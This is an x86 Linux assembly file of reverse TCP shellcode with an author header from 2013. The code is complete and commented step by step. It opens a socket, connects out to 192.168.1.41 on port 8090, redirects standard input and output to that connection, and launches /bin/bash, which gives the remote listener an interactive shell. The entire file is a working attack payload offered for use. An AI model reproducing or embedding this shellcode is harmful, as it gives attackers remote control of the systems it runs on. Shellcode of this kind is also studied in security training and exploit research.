; Filename : reverse_tcp_shell.asm
; Author : M.Acosta <amcx62[_at_]gmail[_dot_]com>
; Date : 2013 August
; Location : Lima(Peru)
; Desc : Reverse Tcp Shellcode
; Tested on : Linux/x86 (Ubuntu SMP 3.2.0-49-generic-pae)

global _start
section .text
_start:
  
; See:
; linux/net.h
; bits/socket.h
; netinet/in.h

;-------------------------------------------------------
; 1) SOCKET SYSCALL
;-------------------------------------------------------
; socket(int domain, int type, int protocol)
; socketcall(int call, unsigned long *args)

xor eax, eax
mov al,102
xor ebx, ebx
mov bl, 1
push byte 6
push byte 1
push byte 2
xor ecx,ecx
mov ecx, esp
int 0x80
mov esi, eax

;----------------------------------------------------------
; CONNECT SYSCALL
;---------------------------------------------------------
; int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen)
; socketcall(int call, unsigned long *args)
xor eax,eax
mov al, 102
xor ebx, ebx
mov bl, 3
push dword 0x2901a8c0; ip 192.168.1.41
push word 0x9a1f ; port 8090
push word 2
mov ecx, esp
push byte 16  ; socklen_t addrlen
push ecx; const struct sockaddr *addr
push esi
mov ecx, esp
int 0x80

;-------------------------------------------------------
; 5) DUP2 SYSCALL
;-------------------------------------------------------
; int dup2(int oldfd, int newfd)
xchg ebx,esi
xor ecx, ecx
mov cl, 2
dup2_loop:
mov al, 0x3f
int 0x80
dec cl
jns dup2_loop

;-------------------------------------------------------
; 6) REVERSE SHELL
;-------------------------------------------------------
xor eax,eax
push eax
push 0x68736162 ;/bin/bash
push 0x2f6e6962
push 0x2f2f2f2f  
mov ebx,esp
push eax
mov edx,esp
push ebx
mov ecx,esp
mov al,11
int 0x80
